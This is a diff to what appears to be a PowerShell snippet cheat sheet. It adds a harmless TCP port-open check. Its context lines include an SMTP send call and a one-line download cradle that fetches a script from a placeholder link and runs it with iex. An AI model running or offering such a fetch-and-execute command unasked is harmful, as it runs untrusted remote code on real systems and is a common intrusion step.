@@ -152,3 +152,17 @@ $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
 ```
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<link>')"
 ```
+
+# Check if a port is open
+
+```
+$ipaddress = IP_Address_Server
+$port = port
+$connection = New-Object System.Net.Sockets.TcpClient($ipaddress, $port)
+if ($connection.Connected) {
+    Write-Host "Success"
+}
+else {
+    Write-Host "Failed"
+}
+```
